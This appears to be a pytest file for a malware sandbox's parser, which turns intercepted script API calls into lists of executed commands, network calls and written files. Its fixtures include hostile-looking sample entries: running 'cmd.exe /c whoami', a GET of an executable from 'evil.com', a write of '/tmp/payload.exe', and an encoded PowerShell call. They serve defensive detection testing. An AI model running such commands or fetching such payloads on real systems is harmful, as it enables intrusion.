from __future__ import annotations

from sandbox.dynamic.parser import parse_intercept_log, DynamicBehavior


def test_parse_wscript_run() -> None:
    log = [{"api": "WScript", "method": "Run", "args": ['"cmd.exe /c whoami"'], "timestamp": "2026-01-01T00:00:00Z"}]
    behavior = parse_intercept_log(log)
    assert any("cmd.exe" in b for b in behavior.commands_executed)


def test_parse_activex_http() -> None:
    log = [{"api": "ActiveX(Microsoft.XMLHTTP)", "method": "open", "args": ['"GET"', '"http://evil.com/p.exe"'], "timestamp": "2026-01-01T00:00:00Z"}]
    behavior = parse_intercept_log(log)
    assert any("evil.com" in u for u in behavior.network_calls)


def test_parse_fs_write() -> None:
    log = [{"api": "fs", "method": "writeFileSync", "args": ['"/tmp/payload.exe"', '"data"'], "timestamp": "2026-01-01T00:00:00Z"}]
    behavior = parse_intercept_log(log)
    assert any("payload.exe" in f for f in behavior.files_written)


def test_parse_empty_log() -> None:
    behavior = parse_intercept_log([])
    assert behavior.commands_executed == []
    assert behavior.network_calls == []
    assert behavior.files_written == []


def test_parse_to_behavior_strings() -> None:
    log = [
        {"api": "WScript", "method": "Run", "args": ['"powershell -enc abc"'], "timestamp": "2026-01-01T00:00:00Z"},
        {"api": "ActiveX(WinHttp.WinHttpRequest)", "method": "send", "args": [], "timestamp": "2026-01-01T00:00:00Z"},
    ]
    behavior = parse_intercept_log(log)
    strings = behavior.to_behavior_strings()
    assert any("powershell" in s for s in strings)
